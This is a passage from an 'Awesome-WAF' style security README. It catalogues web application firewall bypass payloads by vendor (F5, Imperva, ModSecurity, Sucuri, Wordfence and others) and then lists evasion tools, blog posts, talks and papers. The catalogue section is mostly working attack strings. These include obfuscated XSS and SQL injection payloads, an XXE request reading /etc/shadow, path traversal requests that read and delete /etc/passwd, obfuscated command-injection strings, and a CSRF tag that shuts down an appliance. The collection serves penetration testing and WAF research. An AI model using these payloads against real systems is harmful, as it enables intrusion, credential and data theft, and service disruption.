- GET - XSS Bypass (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
```
/search?q=%3Cimg%20src=%22WTF%22%20onError=alert(/0wn3d/.source)%20/%3E

<img src="WTF" onError="{var
{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v%2Ba%2Be%2Bs](e%2Bs%2Bv%2B
h%2Bn)(/0wn3d/.source)" />
```
- POST - XSS Bypass (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
```
<img src="WTF" onError="{var
{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/0wn3d/
.source)" />
```
- `clave` XSS (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
```
/?&idPais=3&clave=%3Cimg%20src=%22WTF%22%20onError=%22{ 
```

### Fortinet Fortiweb
- `pcre_expression` unvaidated XSS by [@Benjamin Mejri](https://www.exploit-db.com/?author=7854)
```
/waf/pcre_expression/validate?redir=/success&mkey=0%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C
/waf/pcre_expression/validate?redir=/success%20%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C&mkey=0 
```
- CSP Bypass by [@Binar10](https://www.exploit-db.com/exploits/18840)

POST Type Query
```
POST /<path>/login-app.aspx HTTP/1.1
Host: <host>
User-Agent: <any valid user agent string>
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: <the content length must be at least 2399 bytes>

var1=datavar1&var2=datavar12&pad=<random data to complete at least 2399 bytes>
```
GET Type Query
```
http://<domain>/path?var1=vardata1&var2=vardata2&pad=<large arbitrary data>
```

### F5 ASM 
- XSS Bypass by [@WAFNinja](https://waf.ninja)
```
<table background="javascript:alert(1)"></table>
"/><marquee onfinish=confirm(123)>a</marquee>
```

### F5 BIG-IP
- XSS Bypass by [@WAFNinja](https://waf.ninja/)
```
<body style="height:1000px" onwheel="[DATA]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
```
- XSS Bypass by [@Aatif Khan](https://twitter.com/thenapsterkhan)
```
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss"onshow="prom%25%32%33%25%32%36x70;t(1)“>
```
- [`report_type` XSS](https://www.securityfocus.com/bid/27462/info) by [@NNPoster](https://www.exploit-db.com/?author=6654)
```
https://host/dms/policy/rep_request.php?report_type=%22%3E%3Cbody+onload=alert(%26quot%3BXSS%26quot%3B)%3E%3Cfoo+
```
- POST Based XXE by [@Anonymous](https://www.exploit-db.com/?author=2168)
```
POST /sam/admin/vpe2/public/php/server.php HTTP/1.1
Host: bigip
Cookie: BIGIPAuthCookie=*VALID_COOKIE*
Content-Length: 143

<?xml  version="1.0" encoding='utf-8' ?>
<!DOCTYPE a [<!ENTITY e SYSTEM '/etc/shadow'> ]>
<message><dialogueType>&e;</dialogueType></message>
```
- Directory Traversal by [@Anastasios Monachos](https://www.exploit-db.com/?author=2932)

Read Arbitrary File
```
/tmui/Control/jspmap/tmui/system/archive/properties.jsp?&name=../../../../../etc/passwd
```
Delete Arbitrary File
```
POST /tmui/Control/form HTTP/1.1
Host: site.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=6C6BADBEFB32C36CDE7A59C416659494; f5advanceddisplay=""; BIGIPAuthCookie=89C1E3BDA86BDF9E0D64AB60417979CA1D9BE1D4; BIGIPAuthUsernameCookie=admin; F5_CURRENT_PARTITION=Common; f5formpage="/tmui/system/archive/properties.jsp?&name=../../../../../etc/passwd"; f5currenttab="main"; f5mainmenuopenlist=""; f5_refreshpage=/tmui/Control/jspmap/tmui/system/archive/properties.jsp%3Fname%3D../../../../../etc/passwd
Content-Type: application/x-www-form-urlencoded

_form_holder_opener_=&handler=%2Ftmui%2Fsystem%2Farchive%2Fproperties&handler_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&showObjList=&showObjList_before=&hideObjList=&hideObjList_before=&enableObjList=&enableObjList_before=&disableObjList=&disableObjList_before=&_bufvalue=icHjvahr354NZKtgQXl5yh2b&_bufvalue_before=icHjvahr354NZKtgQXl5yh2b&_bufvalue_validation=NO_VALIDATION&com.f5.util.LinkedAdd.action_override=%2Ftmui%2Fsystem%2Farchive%2Fproperties&com.f5.util.LinkedAdd.action_override_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&linked_add_id=&linked_add_id_before=&name=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&name_before=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form_page=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&form_page_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&download_before=Download%3A+..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&restore_before=Restore&delete=Delete&delete_before=Delete
```

### F5 FirePass
- SQLi Bypass from [@Anonymous](https://www.exploit-db.com/?author=2168)
```
state=%2527+and+
(case+when+SUBSTRING(LOAD_FILE(%2527/etc/passwd%2527),1,1)=char(114)+then+
BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+ 
```

### ModSecurity
- [RCE Payloads Detection Bypass for PL3](https://www.secjuice.com/web-application-firewall-waf-evasion/) by [@theMiddle](https://twitter.com/Menin_TheMiddle) (v3.1)
```
;+$u+cat+/etc$u/passwd$u
```
- [RCE Payloads Detection Bypass for PL2](https://www.secjuice.com/web-application-firewall-waf-evasion/) by [@theMiddle](https://twitter.com/Menin_TheMiddle) (v3.1)
```
;+$u+cat+/etc$u/passwd+\#
```
- [RCE Payloads for PL1 and PL2](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) by [@theMiddle](https://twitter.com/Menin_TheMiddle) (v3.0)
```
/???/??t+/???/??ss??
```
- [RCE Payloads for PL3](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) by [@theMiddle](https://twitter.com/Menin_TheMiddle) (v3.0)
```
/?in/cat+/et?/passw?
```
- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Johannes Dahse](https://twitter.com/#!/fluxreiners) (v2.2)
```
0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
```
- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Yuri Goltsev](https://twitter.com/#!/ygoltsev) (v2.2)
```
1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')
```
- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Ahmad Maulana](http://twitter.com/#!/hmadrwx) (v2.2)
```
1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-
```
- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Travis Lee](http://twitter.com/#!/eelsivart) (v2.2)
```
amUserId=1 union select username,password,3,4 from users
```
- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Roberto Salgado](http://twitter.com/#!/lightos) (v2.2)
```
%0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201
```
- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Georgi Geshev](http://twitter.com/#!/ggeshev) (v2.2)
```
1%0bAND(SELECT%0b1%20FROM%20mysql.x)
```
- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@SQLMap Devs](http://sqlmap.sourceforge.net/#developers) (v2.2)
```
%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29
```
- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@HackPlayers](http://twitter.com/#!/hackplayers) (v2.2)
```
%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201
```

### Imperva
- [Imperva SecureSphere 13 - Remote Command Execution](https://www.exploit-db.com/exploits/45542) by [@rsp3ar](https://www.exploit-db.com/?author=9396)
- XSS Bypass by [@David Y](https://twitter.com/daveysec)
```
<svg onload\r\n=$.globalEval("al"+"ert()");>
```
- XSS Bypass by [@Emad Shanab](https://twitter.com/alra3ees)
```
<svg/onload=self[`aler`%2b`t`]`1`>
anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
```
- XSS Bypass by [@WAFNinja](https://waf.ninja)
```
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E
```
- XSS Bypass by [@i_bo0om](https://twitter.com/i_bo0om)
```
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
<img/src=q onerror='new Function`al\ert\`1\``'>
```
- XSS Bypass by [@c0d3g33k](https://twitter.com/c0d3g33k)
```
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
```
- SQLi Bypass by [@DRK1WI](https://www.exploit-db.com/?author=7740)
```
15 and '1'=(SELECT '1' FROM dual) and '0having'='0having'
```
- SQLi by [@Giuseppe D'Amore](https://www.exploit-db.com/?author=6413)
```
stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1
```
- [Imperva SecureSphere <= v13 - Privilege Escalation](https://www.exploit-db.com/exploits/45130) by [@0x09AL](https://www.exploit-db.com/?author=8991)

### Kona SiteDefender
- [HTML Injection](https://hackerone.com/reports/263226) by [@sp1d3rs](https://twitter.com/h1_sp1d3rs)
```
%2522%253E%253Csvg%2520height%3D%2522100%2522%2520width%3D%2522100%2522%253E%2520%253Ccircle%2520cx%3D%252250%2522%2520cy%3D%252250%2522%2520r%3D%252240%2522%2520stroke%3D%2522black%2522%2520stroke-width%3D%25223%2522%2520fill%3D%2522red%2522%2520%2F%253E%2520%253C%2Fsvg%253E
```
- [XSS Bypass](https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c) by [@Jonathan Bouman](https://twitter.com/jonathanbouman)
```
<body%20alt=al%20lang=ert%20onmouseenter="top['al'+lang](/PoC%20XSS%20Bypass%20by%20Jonathan%20Bouman/)"
```
- [XSS Bypass](https://twitter.com/XssPayloads/status/1008573444840198144?s=20) by [@zseano](https://twitter.com/zseano)
```
?"></script><base%20c%3D=href%3Dhttps:\mysite>
```
- XSS Bypass by [@0xInfection](https://twitter.com/0xInfection)
```
<abc/onmouseenter=confirm%60%60>
```
- [XSS Bypass](https://hackerone.com/reports/263226) by [@sp1d3rs](https://twitter.com/h1_sp1d3rs)
```
%2522%253E%253C%2Fdiv%253E%253C%2Fdiv%253E%253Cbrute%2520onbeforescriptexecute%3D%2527confirm%28document.domain%29%2527%253E
```
- [XSS Bypass](https://twitter.com/fransrosen/status/1126963506723590148) by [@Frans Rosén](https://twitter.com/fransrosen)
```
<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
```
- [XSS Bypass](https://twitter.com/security_prince/status/1127804521315426304) by [@Ishaq Mohammed](https://twitter.com/security_prince)
```
<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
```

### Profense
- [GET Type CSRF Attack](https://www.exploit-db.com/exploits/7919) by [@Michael Brooks](https://www.exploit-db.com/?author=628) (>= v.2.6.2)

Turn off Proface Machine 
```
<img src=https://host:2000/ajax.html?action=shutdown>
```
Add a proxy
```
<img src=https://10.1.1.199:2000/ajax.html?vhost_proto=http&vhost=vhost.com&vhost_port=80&rhost_proto=http&rhost=10.1.1.1&rhost_port=80&mode_pass=on&xmle=on&enable_file_upload=on&static_passthrough=on&action=add&do=save>
```

- XSS Bypass by [@Michael Brooks](https://www.exploit-db.com/?author=628) (>= v.2.6.2)
```
https://host:2000/proxy.html?action=manage&main=log&show=deny_log&proxy=>"<script>alert(document.cookie)</script>
```
- [XSS Bypass](https://www.securityfocus.com/bid/35053/info) by [@EnableSecurity](https://enablesecurity.com) (>= v2.4)
```
%3CEvil%20script%20goes%20here%3E=%0AByPass
%3Cscript%3Ealert(document.cookie)%3C/script%20ByPass%3E 
```

### QuickDefense
- XSS Bypass by [@WAFNinja](https://waf.ninja/)
```
?<input type="search" onsearch="aler\u0074(1)">
<details ontoggle=alert(1)>
```

### Sucuri
- [Smuggling RCE Payloads](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) by [@theMiddle](https://twitter.com/Menin_TheMiddle)
```
/???/??t+/???/??ss??
```
- [Obfuscating RCE Payloads](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0) by [@theMiddle](https://twitter.com/Menin_TheMiddle)
```
;+cat+/e'tc/pass'wd
c\\a\\t+/et\\c/pas\\swd
```
- [XSS Bypass](https://twitter.com/return_0x/status/1148605627180208129) by [@Luka](https://twitter.com/return_0x)
```
"><input/onauxclick="[1].map(prompt)">
```
- [XSS Bypass](https://twitter.com/brutelogic/status/1148610104738099201) by [@Brute Logic](https://twitter.com/brutelogic)
```
data:text/html,<form action=https://brutelogic.com.br/xss-cp.php method=post>
<input type=hidden name=a value="<img/src=//knoxss.me/yt.jpg onpointerenter=alert`1`>">
<input type=submit></form>
```

### URLScan
- [Directory Traversal](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Beyond%20SQLi%20-%20Obfuscate%20and%20Bypass%20WAFs.txt#L557) by [@ZeQ3uL](http://www.exploit-db.com/author/?a=1275) (<= v3.1) (Only on ASP.NET)
```
http://host.com/test.asp?file=.%./bla.txt
```

### WebARX
- Cross Site Scripting by [@0xInfection](https://twitter.com/0xinfection)
```
<a69/onauxclick=open&#40&#41>rightclickhere
```

### WebKnight
- Cross Site Scripting by [@WAFNinja](https://waf.ninja/)
```
<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
<marquee/onstart=confirm(2)>
<details ontoggle=alert(1)>
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
<img src=x onwheel=prompt(1)>
```
- SQLi by [@WAFNinja](https://waf.ninja)
```
0 union(select 1,username,password from(users))
0 union(select 1,@@hostname,@@datadir)
```
- XSS Bypass by [@Aatif Khan](https://twitter.com/thenapsterkhan) (v4.1)
```
<details ontoggle=alert(1)>
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
```
- [SQLi Bypass](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Beyond%20SQLi%20-%20Obfuscate%20and%20Bypass%20WAFs.txt#L562) by [@ZeQ3uL](http://www.exploit-db.com/author/?a=1275)
```
10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)
```

### Wordfence
- XSS Bypass by [@brute Logic](https://twitter.com/brutelogic)
```
<a href=javas&#99;ript:alert(1)>
```
- XSS Bypass by [@0xInfection](https://twitter.com/0xInfection)
```
<a/**/href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At&colon;/**/alert()/**/>click
```
- [HTML Injection](https://www.securityfocus.com/bid/69815/info) by [@Voxel](https://www.exploit-db.com/?author=8505)
```
http://host/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
```
- [XSS Exploit](https://www.securityfocus.com/bid/56159/info) by [@MustLive](https://www.exploit-db.com/?author=1293) (>= v3.3.5)
```
<html>
<head>
<title>Wordfence Security XSS exploit (C) 2012 MustLive. 
http://websecurity.com.ua</title>
</head>
<body onLoad="document.hack.submit()">
<form name="hack" action="http://site/?_wfsf=unlockEmail" method="post">
<input type="hidden" name="email" 
value="<script>alert(document.cookie)</script>">
</form>
</body>
</html>
```
- [Other XSS Bypasses](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
```
<meter onmouseover="alert(1)"
'">><div><meter onmouseover="alert(1)"</div>"
>><marquee loop=1 width=0 onfinish=alert(1)>
```

### Apache Generic
- Writing method type in lowercase by [@i_bo0om](http://twitter.com/i_bo0om)
```
get /login HTTP/1.1
Host: favoritewaf.com
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
```

### IIS Generic
- Tabs before method by [@i_bo0om](http://twitter.com/i_bo0om)
```
    GET /login.php HTTP/1.1
Host: favoritewaf.com
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
```


## Awesome 工具
### 指纹识别:
- [WAFW00F](https://github.com/enablesecurity/wafw00f) - The ultimate WAF fingerprinting tool with the largest fingerprint database from [@EnableSecurity](https://github.com/enablesecurity).
- [IdentYwaf](https://github.com/stamparm/identywaf) - A blind WAF detection tool which utlises a unique method of identifying WAFs based upon previously collected fingerprints by [@stamparm](https://github.com/stamparm).

### 测试:
- [Lightbulb Framework](https://github.com/lightbulb-framework/lightbulb-framework) - A WAF testing suite written in Python.
- [WAFBench](https://github.com/microsoft/wafbench) - A WAF performance testing suite by [Microsoft](https://github.com/microsoft).
- [WAF Testing Framework](https://www.imperva.com/lg/lgw_trial.asp?pid=483) - A WAF testing tool by [Imperva](https://imperva.com).

### 绕过手法:  
- [WAFNinja](https://github.com/khalilbijjou/wafninja) - A smart tool which fuzzes and can suggest bypasses for a given WAF by [@khalilbijjou](https://github.com/khalilbijjou/).
- [WAFTester](https://github.com/Raz0r/waftester) - Another tool which can obfuscate payloads to bypass WAFs by [@Raz0r](https://github.com/Raz0r/).
- [libinjection-fuzzer](https://github.com/migolovanov/libinjection-fuzzer) - A fizzer intended for finding `libinjection` bypasses but can be probably used universally.
- [bypass-firewalls-by-DNS-history](https://github.com/vincentcox/bypass-firewalls-by-DNS-history) -  A tool which searches for old DNS records for finding actual site behind the WAF.
- [abuse-ssl-bypass-waf](https://github.com/LandGrey/abuse-ssl-bypass-waf) - A tool which finds out supported SSL/TLS ciphers and helps in evading WAFs.
- [SQLMap Tamper Scripts](https://github.com/sqlmapproject/sqlmap) - Tamper scripts in SQLMap obfuscate payloads which might evade some WAFs.
- [Bypass WAF BurpSuite Plugin](https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c) - A plugin for Burp Suite which adds some request headers so that the requests seem from the internal network.

## Blogs and Writeups
- [Web Application Firewall (WAF) Evasion Techniques #1](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) - By [@Secjuice](https://www.secjuice.com).
- [Web Application Firewall (WAF) Evasion Techniques #2](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0) - By [@Secjuice](https://www.secjuice.com).
- [Web Application Firewall (WAF) Evasion Techniques #3](https://www.secjuice.com/web-application-firewall-waf-evasion/) - By [@Secjuice](https://www.secjuice.com).
- [How To Exploit PHP Remotely To Bypass Filters & WAF Rules](https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/)- By [@Secjuice](https://secjuice.com)
- [ModSecurity SQL Injection Challenge: Lessons Learned](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) - By [@SpiderLabs](https://trustwave.com).
- [XXE that can Bypass WAF](https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0) - By [@WallArm](https://labs.wallarm.com).
- [SQL Injection Bypassing WAF](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF) - By [@OWASP](https://owasp.com).
- [How To Reverse Engineer A Web Application Firewall Using Regular Expression Reversing](https://www.sunnyhoi.com/reverse-engineer-web-application-firewall-using-regular-expression-reversing/) - By [@SunnyHoi](https://twitter.com/sunnyhoi).
- [Bypassing Web-Application Firewalls by abusing SSL/TLS](https://0x09al.github.io/waf/bypass/ssl/2018/07/02/web-application-firewall-bypass.html) - By [@0x09AL](https://twitter.com/0x09al).
- [Request Encoding to Bypass WAFs](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/request-encoding-to-bypass-web-application-firewalls/) - By [@Soroush Dalili](https://twitter.com/irsdl)

## Video Presentations
- [WAF Bypass Techniques Using HTTP 标准 and Web Servers Behavior](https://www.youtube.com/watch?v=tSf_IXfuzXk) from [@OWASP](https://owasp.org).
- [Confessions of a WAF Developer: Protocol-Level Evasion of Web App Firewalls](https://www.youtube.com/watch?v=PVVG4rCFZGU) from [BlackHat USA 12](https://blackhat.com/html/bh-us-12).
- [Web Application Firewall - Analysis of Detection Logic](https://www.youtube.com/watch?v=dMFJLicdaC0) from [BlackHat](https://blackhat.com).
- [Bypassing Browser Security Policies for Fun & Profit](https://www.youtube.com/watch?v=P5R4KeCzO-Q) from [BlackHat](https://blackhat.com).
- [Web Application Firewall Bypassing](https://www.youtube.com/watch?v=SD7ForrwUMY) from [Positive Technologies](https://ptsecurity.com).
- [Fingerprinting Filter Rules of Web Application Firewalls - Side Channeling Attacks](https://www.usenix.org/conference/woot12/workshop-program/presentation/schmitt) from [@UseNix](https://www.usenix.com).
- [Evading Deep Inspection Systems for Fun and Shell](https://www.youtube.com/watch?v=BkmPZhgLmRo) from [BlackHat US 13](https://blackhat.com/html/bh-us-13).
- [Bypass OWASP CRS && CWAF (WAF Rule Testing - Unrestricted File Upload)](https://www.youtube.com/watch?v=lWoxAjvgiHs) from [Fools of Security](https://www.youtube.com/channel/UCEBHO0kD1WFvIhf9wBCU-VQ).
- [WAFs FTW! A modern devops approach to security testing your WAF](https://www.youtube.com/watch?v=05Uy0R7UdFw) from [AppSec USA 17](https://www.youtube.com/user/OWASPGLOBAL).
- [Web Application Firewall Bypassing WorkShop](https://www.youtube.com/watch?v=zfBT7Kc57xs) from [OWASP](https://owasp.com).
- [Bypassing Modern WAF's Exemplified At XSS by Rafay Baloch](https://www.youtube.com/watch?v=dWLpw-7_pa8) from [Rafay Bloch](http://rafaybaloch.com).
- [WTF - WAF Testing Framework](https://www.youtube.com/watch?v=ixb-L5JWJgI) from [AppSecUSA 13](https://owasp.org).
- [The Death of a Web App Firewall](https://www.youtube.com/watch?v=mB_xGSNm8Z0) from [Brian McHenry](https://www.youtube.com/channel/UCxzs-N2sHnXFwi0XjDIMTPg).
- [Adventures with the WAF](https://www.youtube.com/watch?v=rdwB_p0KZXM) from [BSides Manchester](https://www.youtube.com/channel/UC1mLiimOTqZFK98VwM8Ke4w).
- [Bypassing Intrusion Detection Systems](https://www.youtube.com/watch?v=cJ3LhQXzrXw) from [BlackHat](https://blackhat.com).
- [Building Your Own WAF as a Service and Forgetting about False Positives](https://www.youtube.com/watch?v=dgqUcHprolc) from [Auscert](https://conference.auscert.org.au).

## Presentations & Research Papers
### Research Papers:
- [Protocol Level WAF Evasion](papers/Qualys%20Guide%20-%20Protocol-Level%20WAF%20Evasion.pdf) - A protocol level WAF evasion techniques and analysis by [Qualys](https://www.qualys.com).
- [Neural Network based WAF for SQLi](papers/Artificial%20Neural%20Network%20based%20WAF%20for%20SQL%20Injection.pdf) - A paper about building a neural network based WAF for detecting SQLi attacks.
- [Bypassing Web Application Firewalls with HTTP Parameter Pollution](papers/Bypassing%20Web%20Application%20Firewalls%20with%20HTTP%20Parameter%20Pollution.pdf) - A research paper from [Exploit DB](https://exploit-db.com) about effectively bypassing WAFs via HTTP Parameter Pollution.
- [Poking A Hole in the Firewall](papers/Poking%20A%20Hole%20In%20The%20Firewall.pdf) - A paper by [Rafay Baloch](https://www.rafaybaloch.com) about modern firewall analysis.
- [Modern WAF Fingerprinting and XSS Filter Bypass](papers/Modern%20WAF%20Fingerprinting%20and%20XSS%20Filter%20Bypass.pdf) - A paper by [Rafay Baloch](https://www.rafaybaloch.com) about WAF fingerprinting and bypassing XSS filters.
- [WAF Evasion Testing](papers/SANS%20Guide%20-%20WAF%20Evasion%20Testing.pdf) - A WAF evasion testing guide from [SANS](https://www.sans.org).
- [Side Channel Attacks for Fingerprinting WAF Filter Rules](papers/Side%20Channel%20(Timing)%20Attacks%20for%20Fingerprinting%20WAF%20Rules.pdf) - A paper about how side channel attacks can be utilised to fingerprint firewall filter rules from [UseNix Woot'12](https://www.usenix.org/conference/woot12).
- [WASC WAF Evaluation Criteria](papers/WASC%20WAF%20Evaluation%20Criteria.pdf) - A guide for WAF Evaluation from [Web Application Security Consortium](http://www.webappsec.org).
- [WAF Evaluation and Analysis](papers/Web%20Application%20Firewalls%20-%20Evaluation%20and%20Analysis.pdf) - A paper about WAF evaluation and analysis of 2 most used WAFs (ModSecurity & WebKnight) from [University of Amsterdam](http://www.uva.nl).
- [Bypassing all WAF XSS Filters](papers/Evading%20All%20Web-Application%20Firewalls%20XSS%20Filters.pdf) - A paper about bypassing all XSS filter rules and evading WAFs for XSS.
- [Beyond SQLi - Obfuscate and Bypass WAFs](papers/Beyond%20SQLi%20-%20Obfuscate%20and%20Bypass%20WAFs.txt) - A research paper from [Exploit Database](https://exploit-db.com) about obfuscating SQL injection queries to effectively bypass WAFs.
- [Bypassing WAF XSS Detection Mechanisms](papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf) - A research paper about bypassing XSS detection mechanisms in WAFs. 

### Presentations:
- [Methods to Bypass a Web Application Firewall](presentrations/Methods%20To%20Bypass%20A%20Web%20Application%20Firewall.pdf) - A presentation from [PT Security](https://www.ptsecurity.com) about bypassing WAF filters and evasion.
- [Web Application Firewall Bypassing (How to Defeat the Blue Team)](presentation/Web%20Application%20Firewall%20Bypassing%20(How%20to%20Defeat%20the%20Blue%20Team).pdf) - A presentation about bypassing WAF filtering and ruleset fuzzing for evasion by [@OWASP](https://owasp.org). 
- [WAF Profiling & Evasion Techniques](presentations/OWASP%20WAF%20Profiling%20&%20Evasion.pdf) - A WAF testing and evasion guide from [OWASP](https://www.owasp.org).
- [Protocol Level WAF Evasion Techniques](presentations/BlackHat%20US%2012%20-%20Protocol%20Level%20WAF%20Evasion%20(Slides).pdf) - A presentation at about efficiently evading WAFs at protocol level from [BlackHat US 12](https://www.blackhat.com/html/bh-us-12/).
- [Analysing Attacking Detection Logic Mechanisms](presentations/BlackHat%20US%2016%20-%20Analysis%20of%20Attack%20Detection%20Logic.pdf) - A presentation about WAF logic applied to detecting attacks from [BlackHat US 16](https://www.blackhat.com/html/bh-us-16/).
- [WAF Bypasses and PHP Exploits](presentations/WAF%20Bypasses%20and%20PHP%20Exploits%20(Slides).pdf) - A presentation about evading WAFs and developing related PHP exploits.
- [Side Channel Attacks for Fingerprinting WAF Filter Rules](presentations/Side%20Channel%20Attacks%20for%20Fingerprinting%20WAF%20Filter%20Rules.pdf) - A presentation about how side channel attacks can be utilised to fingerprint firewall filter rules from [UseNix Woot'12](https://www.usenix.org/conference/woot12).
- [Our Favorite XSS Filters/IDS and how to Attack Them](presentations/Our%20Favourite%20XSS%20WAF%20Filters%20And%20How%20To%20Bypass%20Them.pdf) - A presentation about how to evade XSS filters set by WAF rules from [BlackHat USA 09](https://www.blackhat.com/html/bh-us-09/).
- [Playing Around with WAFs](presentations/Playing%20Around%20with%20WAFs.pdf) - A small presentation about WAF profiling and playing around with them from [Defcon 16](http://www.defcon.org/html/defcon-16/dc-16-post.html).
- [A Forgotten HTTP Invisiblity Cloak](presentation/A%20Forgotten%20HTTP%20Invisibility%20Cloak.pdf) - A presentation about techniques that can be used to bypass common WAFs from [BSides Manchester](https://www.bsidesmcr.org.uk/).
- [Building Your Own WAF as a Service and Forgetting about False Positives](presentations/Building%20Your%20Own%20WAF%20as%20a%20Service%20and%20Forgetting%20about%20False%20Positives.pdf) - A presentation about how to build a hybrid mode waf that can work both in an out-of-band manner as well as inline to reduce false positives and latency [Auscert2019](https://conference.auscert.org.au/).

## Credits & License:
This work has been presented by [Infected Drake](https://twitter.com/0xInfection) [(0xInfection)](https://github.com/0xinfection) and is licensed under the [Apache 2.0 License](LICENSE). 
